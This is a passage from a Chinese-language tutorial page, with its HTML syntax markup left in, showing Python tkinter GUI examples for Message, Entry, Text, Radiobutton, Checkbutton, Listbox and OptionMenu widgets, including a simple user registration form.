class="token operator">+</span>self<span class="token punctuation">.</span>files<span class="token punctuation">[</span>self<span class="token punctuation">.</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>lblImage<span class="token punctuation">[</span><span class="token string">'image'</span><span class="token punctuation">]</span><span class="token operator">=</span>self<span class="token punctuation">.</span>imgroot<span class="token operator">=</span>tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建1个Tk根窗口组件root</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"简易图片浏览器"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置窗口标题</span>app<span class="token operator">=</span>Application<span class="token punctuation">(</span>master<span class="token operator">=</span>root<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Application的对象实例</span>app<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><ul><li>消息Message：显示多行文本信息</li></ul><p><strong>例10：Message示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Message"</span><span class="token punctuation">)</span>w<span class="token operator">=</span>Message<span class="token punctuation">(</span>root<span class="token punctuation">,</span>bg<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Message组件对象</span>w<span class="token punctuation">.</span>config<span class="token punctuation">(</span>text<span class="token operator">=</span><span class="token string">"内容显示在一个宽高比为150%的消息框中"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置显示文本</span>w<span class="token punctuation">[</span><span class="token string">'anchor'</span><span class="token punctuation">]</span><span class="token operator">=</span>W    <span class="token comment" spellcheck="true">#设置停靠方式为左对齐</span>w<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用pack方法，调整其显示位置和大小</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组建的mainloop方法，进入事件循环</span></code></pre><ul><li>单行文本框Entry：显示和编辑文本</li></ul><p><strong>例11：Entry示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Entry"</span><span class="token punctuation">)</span>v<span class="token operator">=</span>StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建StringVar对象</span>w1<span class="token operator">=</span>Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span>textvariable<span class="token operator">=</span>v<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Entry组件对象</span>w1<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#显示单行文本框</span>w1<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取组件的内容</span>v<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token string">'1234'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置StringVar对象的值，组件文本自动更新</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><ul><li>多行文本框Text：显示和编辑多行文本</li></ul><p><strong>例12：Text示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Text"</span><span class="token punctuation">)</span>w<span class="token operator">=</span>Text<span class="token punctuation">(</span>root<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建文本框，宽20，高5（5行，每行20个字符）</span>w<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用pack方法，调整其显示位置和大小</span>w<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span><span class="token string">'生，还是死，这是一个问题！\n'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#1.0代表行号和列号</span>w<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#'生'</span>w<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#'生，还是死，这是一个问题！\n'</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><p><strong>例13：Entry、Text示例：用户注册</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span>tk<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义GUI应用程序类，派生于Frame类</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#构造函数，master为父窗口</span>        self<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的grid方法，调整其显示位置和大小</span>        self<span class="token punctuation">.</span>createWidgets<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用对象方法，创建子组件</span>    <span class="token keyword">def</span> <span class="token function">createWidgets</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#对象方法：创建子组件</span>        self<span class="token punctuation">.</span>lblEmail<span class="token operator">=</span>tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"用户名"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Label组件：用户名</span>        self<span class="token punctuation">.</span>lblPass1<span class="token operator">=</span>tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"密码"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Label组件：密码</span>        self<span class="token punctuation">.</span>lblPass2<span class="token operator">=</span>tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"确认密码"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Label组件：确认密码</span>        self<span class="token punctuation">.</span>lblDesc<span class="token operator">=</span>tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"自我简介"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Label组件：自我简介</span>        self<span class="token punctuation">.</span>lblEmail<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>tk<span class="token punctuation">.</span>E<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Email标签放置0行0列</span>        self<span class="token punctuation">.</span>lblPass1<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>tk<span class="token punctuation">.</span>E<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#密码标签放置1行0列</span>        self<span class="token punctuation">.</span>lblPass2<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>tk<span class="token punctuation">.</span>E<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#确认密码标签放置2行0列</span>        self<span class="token punctuation">.</span>lblDesc<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>tk<span class="token punctuation">.</span>E<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#自我简介标签放置3行0列</span>        self<span class="token punctuation">.</span>entryEmail<span class="token operator">=</span>tk<span class="token punctuation">.</span>Entry<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Entry组件</span>        self<span class="token punctuation">.</span>entryPass1<span class="token operator">=</span>tk<span class="token punctuation">.</span>Entry<span class="token punctuation">(</span>self<span class="token punctuation">,</span>show<span class="token operator">=</span><span class="token string">'*'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#密码默认显示为*</span>        self<span class="token punctuation">.</span>entryPass2<span class="token operator">=</span>tk<span class="token punctuation">.</span>Entry<span class="token punctuation">(</span>self<span class="token punctuation">,</span>show<span class="token operator">=</span><span class="token string">'*'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#确认密码默认显示为*</span>        self<span class="token punctuation">.</span>textDesc<span class="token operator">=</span>tk<span class="token punctuation">.</span>Text<span class="token punctuation">(</span>self<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Text组件</span>        self<span class="token punctuation">.</span>entryEmail<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>columnspan<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#用户名文本框放置0行1列</span>        self<span class="token punctuation">.</span>entryPass1<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>columnspan<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#密码文本框放置1行1列</span>        self<span class="token punctuation">.</span>entryPass2<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>columnspan<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#确认密码文本框放置2行1列</span>        self<span class="token punctuation">.</span>textDesc<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>columnspan<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#自我简介文本框放置3行1列</span>        self<span class="token punctuation">.</span>btnOK<span class="token operator">=</span>tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">'注册'</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>funcOK<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建按钮组件</span>        self<span class="token punctuation">.</span>btnOK<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>tk<span class="token punctuation">.</span>E<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#注册按钮放置4行1列</span>        self<span class="token punctuation">.</span>btnCancel<span class="token operator">=</span>tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">'取消'</span><span class="token punctuation">,</span>command<span class="token operator">=</span>root<span class="token punctuation">.</span>destroy<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#创建按钮组件</span>        self<span class="token punctuation">.</span>btnCancel<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>sticky<span class="token operator">=</span>tk<span class="token punctuation">.</span>W<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#取消按钮放置4行2列</span>    <span class="token keyword">def</span> <span class="token function">funcOK</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义注册事件处理程序</span>        str1<span class="token operator">=</span><span class="token string">'欢迎注册：\n'</span>        str1<span class="token operator">+=</span><span class="token string">'您的账户为：'</span><span class="token operator">+</span>self<span class="token punctuation">.</span>entryEmail<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span>    <span class="token comment" spellcheck="true">#获取用户名</span>        str1<span class="token operator">+=</span><span class="token string">'您的特长为：\n'</span><span class="token operator">+</span>self<span class="token punctuation">.</span>textDesc<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>tk<span class="token punctuation">.</span>END<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取自我简介</span>        tk<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span><span class="token string">"注册"</span><span class="token punctuation">,</span>str1<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#弹出消息框</span>root<span class="token operator">=</span>tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"新用户注册"</span><span class="token punctuation">)</span>app<span class="token operator">=</span>Application<span class="token punctuation">(</span>master<span class="token operator">=</span>root<span class="token punctuation">)</span>app<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>单选按钮Radiobutton<ul><li>选择同一组单选按钮中的一个</li></ul></li></ul><p><strong>例14：Radiobutton示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Radiobutton"</span><span class="token punctuation">)</span>v<span class="token operator">=</span>StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>v<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token string">'M'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建StringVar对象，并设置初始值</span>w1<span class="token operator">=</span>Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"男"</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">'M'</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>v<span class="token punctuation">)</span>w2<span class="token operator">=</span>Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"女"</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">'F'</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>v<span class="token punctuation">)</span>w1<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>LEFT<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用pack方法，调整其显示位置</span>w2<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>LEFT<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用pack方法，调整其显示位置</span>v<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#选择女后，获取其值：'F'</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用组件的mainloop方法，进入事件循环</span></code></pre><ul><li>复选框Checkbutton：选择一项或多选选项</li></ul><p><strong>例15：Checkbutton示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Checkbutton"</span><span class="token punctuation">)</span>v<span class="token operator">=</span>StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建StringVar对象</span>v<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token string">'yes'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置默认值为'yes'，对应选择状态</span>w<span class="token operator">=</span>Checkbutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"音乐"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>v<span class="token punctuation">,</span>onvalue<span class="token operator">=</span><span class="token string">'yes'</span><span class="token punctuation">,</span>offvalue<span class="token operator">=</span><span class="token string">'no'</span><span class="token punctuation">)</span>w<span class="token punctuation">.</span>packv<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>列表框Listbox<ul><li>显示对象列表，并且允许用户选择一个或多个项</li></ul></li></ul><p><strong>例16：Listbox示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Listbox"</span><span class="token punctuation">)</span>v<span class="token operator">=</span>StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>v<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'linux'</span><span class="token punctuation">,</span><span class="token string">'windows'</span><span class="token punctuation">,</span><span class="token string">'unix'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lb<span class="token operator">=</span>Listbox<span class="token punctuation">(</span>root<span class="token punctuation">,</span>selectmode<span class="token operator">=</span>EXTENDED<span class="token punctuation">,</span>listvariable<span class="token operator">=</span>v<span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span><span class="token string">'tkinter'</span><span class="token punctuation">,</span><span class="token string">'widget'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    lb<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>END<span class="token punctuation">,</span>item<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#列表框</span>lb<span class="token punctuation">.</span>curselection<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#选择项目的索引位置</span><span class="token keyword">for</span> i <span class="token keyword">in</span> lb<span class="token punctuation">.</span>curselection<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>lb<span class="token punctuation">.</span>get<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出选择项目</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong>例17：Listbox示例：实现列表选择功能</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span>tk<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        tk<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>createWidget<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">createWidget</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>listboxLeft<span class="token operator">=</span>tk<span class="token punctuation">.</span>Listbox<span class="token punctuation">(</span>self<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>listboxLeft<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'北京'</span><span class="token punctuation">,</span><span class="token string">'天津'</span><span class="token punctuation">,</span><span class="token string">'上海'</span><span class="token punctuation">,</span><span class="token string">'重庆'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#插入列表数据</span>        self<span class="token punctuation">.</span>listboxLeft<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>rowspan<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#置于0行0列跨5行</span>        self<span class="token punctuation">.</span>listboxRight<span class="token operator">=</span>tk<span class="token punctuation">.</span>Listbox<span class="token punctuation">(</span>self<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>listboxRight<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>rowspan<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#按钮</span>        self<span class="token punctuation">.</span>btnToRight<span class="token operator">=</span>tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">'  >  '</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>funcToRight<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>btnToRight<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>btnToLeft<span class="token operator">=</span>tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">'  &lt;  '</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>funcToLeft<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>btnToLeft<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">funcToRight</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义事件处理程序：在右边列表框显示左边列表框选中的内容</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> self<span class="token punctuation">.</span>listboxLeft<span class="token punctuation">.</span>curselection<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#选中的内容</span>            self<span class="token punctuation">.</span>listboxRight<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tk<span class="token punctuation">.</span>END<span class="token punctuation">,</span>self<span class="token punctuation">.</span>listboxLeft<span class="token punctuation">.</span>get<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> self<span class="token punctuation">.</span>listboxLeft<span class="token punctuation">.</span>curselection<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>listboxLeft<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>item<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#从左边列表框删除选中的内容</span>    <span class="token keyword">def</span> <span class="token function">funcToLeft</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义事件处理程序：在左边列表框显示右边列表框选中的内容</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> self<span class="token punctuation">.</span>listboxRight<span class="token punctuation">.</span>curselection<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>listboxLeft<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tk<span class="token punctuation">.</span>END<span class="token punctuation">,</span>self<span class="token punctuation">.</span>listboxRight<span class="token punctuation">.</span>get<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> self<span class="token punctuation">.</span>listboxRight<span class="token punctuation">.</span>curselection<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>listboxRight<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>item<span class="token punctuation">)</span>root<span class="token operator">=</span>tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'列表框'</span><span class="token punctuation">)</span>app<span class="token operator">=</span>Application<span class="token punctuation">(</span>master<span class="token operator">=</span>root<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Application的对象实例</span>app<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>选择性OptionMenu：选项列表框</li></ul><p><strong>例18：OptionMenu示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"选择项"</span><span class="token punctuation">)</span>v<span class="token operator">=</span>StringVar<span class="token punctuation">(</span>root<span class="token punctuation">)</span>v<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token string">'Python'</span><span class="token punctuation">)</span>om<span class="token operator">=</span>OptionMenu<span class="token punctuation">(</span>root<span class="token punctuation">,</span>v<span class="token punctuation">,</span><span class="token string">'Python'</span><span class="token punctuation">,</span><span class="token string">'Perl'</span><span class="token punctuation">,</span><span class="token string">'JavaScript'</span><span class="token punctuation">,</span><span class="token string">'C#'</span><span class="token punctuation">)</span>om<span class="token punctuation">[</span><span class="token string">'width'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">10</span>om<span class="token punctuation">[</span><span class="token string">'anchor'</span><span class="token punctuation">]</span><span class="token operator">=</span>Wom<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong>例19：OptionMenu示例2</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#从组合框中选择字体大小，然后单击“改变字体”按钮，改变标签文本的字体大小</span><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span>tk<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token 